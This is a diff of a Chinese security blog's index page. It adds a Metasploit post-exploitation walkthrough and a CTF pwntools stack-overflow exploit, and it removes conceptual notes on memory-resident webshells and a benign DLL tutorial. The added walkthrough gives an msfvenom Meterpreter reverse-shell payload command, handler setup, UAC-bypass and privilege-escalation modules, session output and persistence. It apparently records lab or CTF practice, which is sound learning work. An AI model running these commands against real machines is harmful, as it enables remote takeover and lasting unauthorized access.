@@ -156,6 +156,167 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/CTF/msf%E6%9C%A8%E9%A9%AC%E4%B8%8A%E7%BA%BF%E5%90%8E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
+      <meta itemprop="name" content="Paul C">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Paul C's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/categories/CTF/msf%E6%9C%A8%E9%A9%AC%E4%B8%8A%E7%BA%BF%E5%90%8E/" class="post-title-link" itemprop="url">msf后渗透维持</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2023-11-28 14:19:49" itemprop="dateCreated datePublished" datetime="2023-11-28T14:19:49+08:00">2023-11-28</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-12-06 19:26:38" itemprop="dateModified" datetime="2023-12-06T19:26:38+08:00">2023-12-06</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\22154&gt;netstat -ano|findstr 11300</span><br><span class="line">  TCP    172.30.48.1:53633      172.30.56.107:11300    ESTABLISHED     21716</span><br><span class="line">  TCP    172.30.48.1:53699      172.30.56.107:11300    ESTABLISHED     5212</span><br><span class="line">  TCP    172.30.48.1:53704      172.30.56.107:11300    ESTABLISHED     17876</span><br></pre></td></tr></table></figure>
+<p><img src="/categories/CTF/msf%E6%9C%A8%E9%A9%AC%E4%B8%8A%E7%BA%BF%E5%90%8E/1701172793037.png" alt="1701172793037"></p>
+<p>[<em>] UAC is Enabled, checking level…<br>[+] Part of Administrators group! Continuing…<br>[!] UAC set to DoNotPrompt - using ShellExecute “runas” method instead<br>[</em>] Uploading kFJOgrXchF.exe - 7168 bytes to the filesystem…</p>
+<p>msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp lhost=172.30.56.107 lport=11300 -i 3 -e x86/shikata_ga_nai -f exe -o payload.exe</p>
+<p>use exploit/multi/handler<br>set payload windows/meterpreter/reverse_tcp #设置成payload的模式<br>set LHOST 172.30.56.107<br>set lport 11300<br>exploit -j<br>sessions -i 2<br>shell</p>
+<h1 id="进行进程迁移"><a href="#进行进程迁移" class="headerlink" title="进行进程迁移"></a>进行进程迁移</h1><p>tasklist|findstr explorer<br>migrate 1844<br>background<br>chcp 65001</p>
+<h1 id="探测系统漏洞，比较耗费系统资源"><a href="#探测系统漏洞，比较耗费系统资源" class="headerlink" title="探测系统漏洞，比较耗费系统资源"></a>探测系统漏洞，比较耗费系统资源</h1><p>use post/multi/recon/local_exploit_suggester<br>set session 1<br>exploit </p>
+<p>use exploit/windows/local/ms16_032_secondary_logon_handle_privesc</p>
+<p>use exploit/windows/local/bypassuac_fodhelper</p>
+<p>set session 3</p>
+<p>exploit </p>
+<h2 id="上传到了临时文件夹"><a href="#上传到了临时文件夹" class="headerlink" title="上传到了临时文件夹"></a>上传到了临时文件夹</h2><p>检测发现后面上传的利用工具都</p>
+<p>C:\Users\22154\AppData\Local\Temp\OkNyUvljPBU.ps1<br>C:\Users\22154\AppData\Local\Temp\AFYMdwEU.ps1<br>VFvBBvAw.exe</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/local/bypassuac_dotnet_profiler) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 172.30.56.107:11300</span><br><span class="line">[*] UAC is Enabled, checking level...</span><br><span class="line">[+] Part of Administrators group! Continuing...</span><br><span class="line">[!] UAC set to DoNotPrompt - using ShellExecute &quot;runas&quot; method instead</span><br><span class="line">[*] Uploading XyrFnIA.exe - 7168 bytes to the filesystem...</span><br><span class="line">[*] Executing Command!</span><br><span class="line">[*] Sending stage (200774 bytes) to 172.30.48.1</span><br><span class="line">[*] Meterpreter session 5 opened (172.30.56.107:11300 -&gt; 172.30.48.1:54093) at 2023-11-28 20:15:41 +0800</span><br></pre></td></tr></table></figure>
+<h2 id="维持"><a href="#维持" class="headerlink" title="维持"></a>维持</h2><p>run persistence 借助vbs</p>
+<p><img src="/categories/CTF/msf%E6%9C%A8%E9%A9%AC%E4%B8%8A%E7%BA%BF%E5%90%8E/1701177877128.png" alt="1701177877128"></p>
+<h2 id="加固"><a href="#加固" class="headerlink" title="加固"></a>加固</h2><h4 id="关闭“启用粘滞键”选项"><a href="#关闭“启用粘滞键”选项" class="headerlink" title="关闭“启用粘滞键”选项"></a>关闭“启用粘滞键”选项</h4><p>辅助功能—&gt;键盘，全部取消。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/CTF/xsbAWDP/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
+      <meta itemprop="name" content="Paul C">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Paul C's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/categories/CTF/xsbAWDP/" class="post-title-link" itemprop="url">XSB2023 Py</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2023-11-19 14:19:49 / Modified: 16:25:05" itemprop="dateCreated datePublished" datetime="2023-11-19T14:19:49+08:00">2023-11-19</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>我的EXP</p>
+<p>我也找对了漏洞所在，是打赢BOSS2后留名字的栈溢出。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">r = remote(&quot;47.94.85.181&quot;,22872) #连接指定IP及端口，题目给定</span><br><span class="line">r.recvlines(10)       #运行到字符串位置停下</span><br><span class="line"></span><br><span class="line">for i in range(10000):</span><br><span class="line">    r.sendline(&quot;2&quot;)       #运行到字符串位置停下</span><br><span class="line">    r.recvline()</span><br><span class="line">    r.sendline(&quot;1&quot;)</span><br><span class="line">    r.recvlines(7)   </span><br><span class="line">r.sendline(&quot;2&quot;)       #运行到字符串位置停下</span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(&quot;2&quot;)</span><br><span class="line">r.recvlines(7)   </span><br><span class="line">payload = &#x27;A&#x27; * 9 + str(p64(0x00117630))#+str(p64(&#x27;flag&#x27;))+str(0x0000000000000001)+str(0x0000000000000001)#发送数据，输入数据溢出,并覆盖,返回到目标位置</span><br><span class="line">r.sendline(payload)         #发送 payload</span><br><span class="line">r.interactive()             #交互</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/ML/Few-Shot20/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -827,188 +988,10 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/Notes/%E5%86%85%E5%AD%98%E9%A9%AC/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
-      <meta itemprop="name" content="Paul C">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Paul C's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/categories/Notes/%E5%86%85%E5%AD%98%E9%A9%AC/" class="post-title-link" itemprop="url">Memory-resident Malware</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2023-09-25 09:58:58 / Modified: 10:16:48" itemprop="dateCreated datePublished" datetime="2023-09-25T09:58:58+08:00">2023-09-25</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Notes/" itemprop="url" rel="index"><span itemprop="name">笔记</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>主打隐蔽，：</p>
-<p>内存中，无文件落地到磁盘；</p>
-<ul>
-<li>内核级别操作 rootkit</li>
-<li>在内存中生成文件</li>
-<li><strong>反射式DLL注入</strong>：这是一种技术，它允许恶意软件在不使用硬盘上的文件的情况下，将DLL注入到进程的内存中。 </li>
-<li><p><strong>进程注入</strong>：攻击者可以将自己的恶意进程注入到合法进程的地址空间中 </p>
-</li>
-<li><p><strong>DLL注入</strong>：恶意软件可以注入恶意动态链接库（DLL）到其他进程的内存中 </p>
-</li>
-</ul>
-<h2 id="Webshell的内存马分类："><a href="#Webshell的内存马分类：" class="headerlink" title="Webshell的内存马分类："></a>Webshell的内存马分类：</h2><p>1.servlet-api型<br>通过命令执行等方式动态注册一个新的listener、filter或者servlet，从而实现命令执行等功能。特定框架、容器的内存马原理与此类似，如spring的controller内存马，tomcat的valve内存马</p>
-<p>2.字节码增强型<br>通过java的instrumentation动态修改已有代码，进而实现命令执行等功能。</p>
-<p>客户端—&gt;Listener—&gt;Filter—&gt;Servlet</p>
-<p> 在 web.xml 注册了一个 Filter 来对某个 Servlet 程序进行拦截处理 ；</p>
-<p> Filter.doFilter  —&gt; 调用 FilterChain.doFilter ( FilterChain Object)—&gt; 激活目标 Servlet 的 service  ；</p>
-<p> filter链<br>当多个filter同时存在的时候，组成了filter链。web服务器根据Filter在web.xml文件中的注册顺序，决定先调用哪个Filter。当第一个Filter的doFilter方法被调用时，web服务器会创建一个代表Filter链的FilterChain对象传递给该方法，通过判断FilterChain中是否还有filter决定后面是否还调用filter。 </p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/Notes/Linkers&Loaders05/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
-      <meta itemprop="name" content="Paul C">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Paul C's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/categories/Notes/Linkers&Loaders05/" class="post-title-link" itemprop="url">Chap09-DLL</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2023-09-08 17:58:58 / Modified: 18:11:44" itemprop="dateCreated datePublished" datetime="2023-09-08T17:58:58+08:00">2023-09-08</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Notes/" itemprop="url" rel="index"><span itemprop="name">笔记</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="DLL-模块"><a href="#DLL-模块" class="headerlink" title="DLL 模块"></a>DLL 模块</h2><ul>
-<li>.dll</li>
-<li>.ocx, （Ole Control Extension） ，OCX控件，新的应用程序基本不再使用。</li>
-<li>.cpl,控制面板程序 ，双击即可启动。</li>
-</ul>
-<p>微软的补丁，通常是待更新的dll积累到一定程度后的一个Service Packs软件更新包。</p>
-<p>ELF的动态链接可以运行时加载，Win下用这种技术用得更多，例如ActiveX。</p>
-<p>Win32以后，进程有独立的地址空间，一个dll文件在不同的经常内部拥有不同的私有数据副本。</p>
-<p><strong>ELF的代码段是地址无关的，而DLL的代码并不是地址无关。</strong></p>
-<h3 id="DLL共享利用点："><a href="#DLL共享利用点：" class="headerlink" title="DLL共享利用点："></a>DLL共享利用点：</h3><p>DLL共享数据段实现进程间通信，此时，dll中往往有两个数据段，一个是把共享的数据单独拿出来作为一个段的进程间共享数据段，另一个私有。</p>
-<p>GUEST权限的用户可以通过修改DLL里的共享数据，影响到其他使用该 DLL文件的进程。因此，DLL共享数据段实现进程间通信应该尽量避免。</p>
-<h2 id="Dll开发"><a href="#Dll开发" class="headerlink" title="Dll开发"></a>Dll开发</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//防止C++编译器进行符号修饰</span></span><br><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">                       DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">                       LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function">                     )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport) <span class="function"><span class="type">double</span> <span class="title">Add</span><span class="params">(<span class="type">double</span> a, <span class="type">double</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 减法函数</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport) <span class="function"><span class="type">double</span> <span class="title">Subtract</span><span class="params">(<span class="type">double</span> a, <span class="type">double</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a - b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 乘法函数</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport) <span class="function"><span class="type">double</span> <span class="title">Multiply</span><span class="params">(<span class="type">double</span> a, <span class="type">double</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a * b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;dumpbin /EXPORTS Dll1.dll</span><br><span class="line"></span><br><span class="line">    ordinal hint RVA      name</span><br><span class="line"></span><br><span class="line">          1    0 000110A0 Add</span><br><span class="line">          2    1 00011271 Multiply</span><br><span class="line">          3    2 000111C7 Subtract</span><br></pre></td></tr></table></figure>
-<p>​    .lib文件是一组目标文件的集合。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//加载静态链接库</span><br><span class="line">#pragma comment(lib,&quot;../Debug/libMathFunctions.lib&quot;)</span><br></pre></td></tr></table></figure>
-<h2 id="加载动态链接库"><a href="#加载动态链接库" class="headerlink" title="加载动态链接库"></a>加载动态链接库</h2><blockquote>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/houkai/archive/2013/06/05/3119513.html">https://www.cnblogs.com/houkai/archive/2013/06/05/3119513.html</a></p>
-</blockquote>
-<h3 id="隐式链接"><a href="#隐式链接" class="headerlink" title="隐式链接"></a>隐式链接</h3><p>1.2. 修改包含目录(.h所在文件)和库目录(.lib所在目录)</p>
-<p><img src="/categories/Notes/Linkers&Loaders05/1694166330701.png" alt="1694166330701"></p>
-<p>3.项目-&gt;属性-&gt;配置属性-&gt;链接器-&gt;输入-&gt; 在“附加依赖项”里添加“testdll.lib”（</p>
-<p>若有多个 lib 则以空格隔开） </p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数原型（导入DLL中的函数）</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllimport) <span class="function"><span class="type">double</span> <span class="title">Add</span><span class="params">(<span class="type">double</span> a, <span class="type">double</span> b)</span></span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllimport) <span class="function"><span class="type">double</span> <span class="title">Subtract</span><span class="params">(<span class="type">double</span> a, <span class="type">double</span> b)</span></span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllimport) <span class="function"><span class="type">double</span> <span class="title">Multiply</span><span class="params">(<span class="type">double</span> a, <span class="type">double</span> b)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">double</span> x = <span class="number">10</span>;</span><br><span class="line">    <span class="type">double</span> y = <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用DLL中的加法函数</span></span><br><span class="line">    <span class="type">double</span> sum = <span class="built_in">Add</span>(x, y);</span><br><span class="line">    std::cout &lt;&lt; x &lt;&lt; <span class="string">&quot; + &quot;</span> &lt;&lt; y &lt;&lt; <span class="string">&quot; = &quot;</span> &lt;&lt; sum &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用DLL中的减法函数</span></span><br><span class="line">    <span class="type">double</span> difference = <span class="built_in">Subtract</span>(x, y);</span><br><span class="line">    std::cout &lt;&lt; x &lt;&lt; <span class="string">&quot; - &quot;</span> &lt;&lt; y &lt;&lt; <span class="string">&quot; = &quot;</span> &lt;&lt; difference &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用DLL中的乘法函数</span></span><br><span class="line">    <span class="type">double</span> product = <span class="built_in">Multiply</span>(x, y);</span><br><span class="line">    std::cout &lt;&lt; x &lt;&lt; <span class="string">&quot; * &quot;</span> &lt;&lt; y &lt;&lt; <span class="string">&quot; = &quot;</span> &lt;&lt; product &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>Ctrl+F7编译通过，但是程序运行就报错，</p>
-<p>还需要将testdll.dll复制到当前项目生成的可执行文件所在的目录。 </p>
-<h3 id="显示链接"><a href="#显示链接" class="headerlink" title="显示链接"></a>显示链接</h3><p> 项目菜单——项目属性——配置属性——常规——高级——字符集，将使用Unicode字符集改为未设置即可。 </p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">typedef</span> <span class="title">double</span> <span class="params">(*pAdd)</span><span class="params">(<span class="type">double</span> a, <span class="type">double</span> b)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">typedef</span> <span class="title">double</span> <span class="params">(*pSubtract)</span><span class="params">(<span class="type">double</span> a, <span class="type">double</span> b)</span></span>;</span><br><span class="line"></span><br><span class="line">    HMODULE hDLL = <span class="built_in">LoadLibrary</span>(<span class="string">&quot;Dll1.dll&quot;</span>); <span class="comment">//加载dll文件，需要把dll拷贝到当前目录 </span></span><br><span class="line">    <span class="keyword">if</span> (hDLL != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        pAdd fp1 = <span class="built_in">pAdd</span>(<span class="built_in">GetProcAddress</span>(hDLL, <span class="built_in">MAKEINTRESOURCE</span>(<span class="number">1</span>))); <span class="comment">//得到dll中的第一个函数</span></span><br><span class="line">        <span class="keyword">if</span> (fp1 != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            cout &lt;&lt; <span class="built_in">fp1</span>(<span class="number">2.5</span>, <span class="number">5.5</span>) &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;Cannot Find Function &quot;</span> &lt;&lt; <span class="string">&quot;add&quot;</span> &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">        pSubtract fp2 = <span class="built_in">pSubtract</span>(<span class="built_in">GetProcAddress</span>(hDLL, <span class="string">&quot;Subtract&quot;</span>)); <span class="comment">//使用了externC，所以不用考虑C++修饰符</span></span><br><span class="line">        <span class="keyword">if</span> (fp2 != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            cout &lt;&lt; <span class="built_in">fp2</span>(<span class="number">5.5</span>, <span class="number">2.5</span>) &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;Cannot Find Function &quot;</span> &lt;&lt; <span class="string">&quot;Subtract&quot;</span> &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">FreeLibrary</span>(hDLL);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Cannot Find &quot;</span> &lt;&lt; <span class="string">&quot;Dll1.dll&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><a class="page-number" href="/page/7/">7</a><a class="page-number" href="/page/8/">8</a><span class="space">&hellip;</span><a class="page-number" href="/page/18/">18</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
